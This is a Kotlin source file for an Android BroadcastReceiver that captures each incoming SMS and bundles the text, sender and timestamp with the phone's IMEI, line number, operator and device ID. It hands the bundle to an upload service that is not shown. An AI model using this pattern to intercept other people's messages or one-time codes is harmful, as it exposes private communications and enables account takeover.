package th.`in`.jane.smsreader

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Log
import io.paperdb.Paper
import org.json.JSONObject


class SmsBroadcastReceiver: BroadcastReceiver(){
    var TAG = "SMS Uploader: "

    init {
        Log.d(TAG,"call init()")
    }

    override fun onReceive(context: Context, intent: Intent) {
        var smsBody: String = ""
        val json = JSONObject()

        val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

        for (smsMessage in smsMessages) {
            smsBody += smsMessage.getMessageBody()
        }

        json.put("type" , "receive")
        json.put("message", smsBody)
        json.put("from", smsMessages[0].getOriginatingAddress())
        json.put("timestamp", smsMessages[0].getTimestampMillis())

        Paper.init(context)
        try
        {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            json.put("imei", tm.imei)
            json.put("operator_name", tm.networkOperatorName)
            json.put("line_number", tm.line1Number)
            json.put("device_id",tm.deviceId)

            UploaderIntentService.startActionSms(context, json.toString())
            Log.d(TAG,json.toString())
        }
        catch (e:Exception) {
            Log.d(TAG,e.toString())
        }
    }
}